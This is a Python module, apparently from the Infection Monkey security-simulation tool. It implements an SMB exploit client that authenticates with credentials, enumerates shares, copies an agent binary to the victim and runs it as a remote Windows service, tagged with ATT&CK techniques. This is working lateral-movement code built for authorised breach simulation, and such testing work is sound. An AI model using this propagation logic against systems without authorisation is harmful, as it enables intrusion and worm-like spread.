import logging
import ntpath
from contextlib import suppress
from io import BytesIO
from pathlib import PurePath
from typing import Iterator, List, MutableSet, Optional, Tuple

from common import OperatingSystem
from common.credentials import Credentials
from common.tags import (
    T1021_ATTACK_TECHNIQUE_TAG,
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
    T1135_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
    T1569_ATTACK_TECHNIQUE_TAG,
)
from infection_monkey.exploit.tools import (
    IRemoteAccessClient,
    RemoteAuthenticationError,
    RemoteCommandExecutionError,
    RemoteFileCopyError,
)
from infection_monkey.i_puppet import TargetHost

from .smb_client import ShareInfo, SMBClient
from .smb_options import SMBOptions

logger = logging.getLogger(__name__)

SERVICE_NAME = "InfectionMonkey"
LOGIN_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1110_ATTACK_TECHNIQUE_TAG,  # Brute Force
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
}
COPY_FILE_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1105_ATTACK_TECHNIQUE_TAG,  # Ingress Tool Transfer
    T1135_ATTACK_TECHNIQUE_TAG,  # Network Share Discovery
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
}
EXECUTION_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
    T1569_ATTACK_TECHNIQUE_TAG,  # Execution: System Services
}


class CopiedFileDetails:
    """Stores the details of a copied file"""

    def __init__(self, remote_path: PurePath, destination_path: PurePath):
        self.remote_path = remote_path
        self.destination_path = destination_path


class SMBExploitClient(IRemoteAccessClient):
    """Manages the SMB connection, Exploitation events"""

    def __init__(
        self,
        host: TargetHost,
        options: SMBOptions,
        smb_client: SMBClient = SMBClient(),
    ):
        self._host = host
        self._options = options
        self._copied_file_details: Optional[CopiedFileDetails] = None
        self._authenticated_credentials: Optional[Credentials] = None
        self._smb_client = smb_client

    def login(self, credentials: Credentials, tags: MutableSet[str]):
        map(tags.add, LOGIN_TAGS)

        try:
            self._smb_client.connect_with_user(
                self._host, credentials, timeout=self._options.smb_connect_timeout
            )
        except Exception as err:
            error_message = f"Failed to authenticate over SMB with {credentials}: {err}"
            raise RemoteAuthenticationError(error_message)

        self._authenticated_credentials = credentials

    def get_os(self) -> OperatingSystem:
        return OperatingSystem.WINDOWS

    def execute_detached(self, command: str, tags: MutableSet[str]):
        if not self._authenticated_credentials:
            raise RemoteCommandExecutionError("Not authenticated")

        if not self._copied_file_details:
            raise RemoteCommandExecutionError("File was not copied before executing it")

        try:
            map(tags.add, EXECUTION_TAGS)
            self._smb_client.run_service(
                SERVICE_NAME,
                command,
                self._host,
                [139, 445],
                self._authenticated_credentials,
                self._options.smb_connect_timeout,
            )
        except Exception as err:
            raise RemoteCommandExecutionError(err)

    def copy_file(self, file: bytes, destination_path: PurePath, tags: MutableSet[str]):
        map(tags.add, (T1021_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG))
        self._smb_client.query_server_info()

        tags.add(T1135_ATTACK_TECHNIQUE_TAG)
        shares = self._query_shares(destination_path)
        for remote_path, share in self._connected_shares(shares):
            logger.debug(
                f"Trying to copy monkey file to share '{share.name}' "
                f"[{share.path}{remote_path}] on victim {self._host}"
            )

            try:
                if not self._smb_client.connected():
                    raise RemoteFileCopyError("Not authenticated")
                file_io = BytesIO(file)
                self._smb_client.set_timeout(self._options.agent_binary_upload_timeout)
                tags.add(T1105_ATTACK_TECHNIQUE_TAG)
                self._smb_client.send_file(share.name, remote_path, file_io.read)

                logger.info(
                    f"Copied monkey agent to remote share '{share.name}' "
                    f"[{share.path}] on victim {self._host}"
                )

                self._copied_file_details = CopiedFileDetails(
                    PurePath(ntpath.join(share.path, remote_path.strip(ntpath.sep))),
                    destination_path,
                )
                return
            except Exception as exc:
                error_message = (
                    f"Error uploading monkey to share '{share.name}' on victim {self._host}: {exc}"
                )
                logger.error(error_message)
                raise RemoteFileCopyError(error_message)
        raise RemoteFileCopyError("Failed to connect to any share")

    def get_writable_paths(self) -> List[PurePath]:
        return []

    def _query_shares(self, path: PurePath) -> Tuple[Tuple[str, ShareInfo], ...]:
        """
        Queries the host for SMB shares.

        :param host: A target host on which we query for SMB shares
        :param path: An SMB shares path
        :return: A tuple consisting of share name and info pairs
        """
        high_priority_shares: Tuple[Tuple[str, ShareInfo], ...] = ()
        low_priority_shares: Tuple[Tuple[str, ShareInfo], ...] = ()
        file_name = path.name

        for share in self._smb_client.query_shared_resources():
            if share.current_uses >= share.max_uses:
                logger.debug(
                    f"Skipping share '{share.name}' on victim "
                    f"{self._host} because max uses is exceeded",
                )
                continue
            elif not share.path:
                logger.debug(
                    f"Skipping share '{share.name}' on victim "
                    f"{self._host} because share path is invalid",
                )
                continue

            if str(path).lower().startswith(share.path.lower()):
                high_priority_shares += ((ntpath.sep + str(path)[len(share.path) :], share),)

            low_priority_shares += ((ntpath.sep + file_name, share),)

        return high_priority_shares + low_priority_shares

    def _connected_shares(
        self, shares: Tuple[Tuple[str, ShareInfo], ...]
    ) -> Iterator[Tuple[str, ShareInfo]]:
        """
        Gets SMB connected share on target host

        :param host: A target host on which we connect to SMB shares
        :param shares: Queried SMB shares from target host
        :return: A tuple of connected shares, path and info
        """

        for remote_path, share in shares:
            # TODO: Do we really need to handle reconnects?
            if not self._smb_client.connected():
                if not self._authenticated_credentials:
                    break
                with suppress(Exception):
                    self._smb_client.connect_with_user(self._host, self._authenticated_credentials)
                if not self._smb_client.connected():
                    break

            try:
                self._smb_client.connect_to_share(share.name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share.path}" on victim {self._host}: {exc}'
                )
                continue

            yield remote_path, share
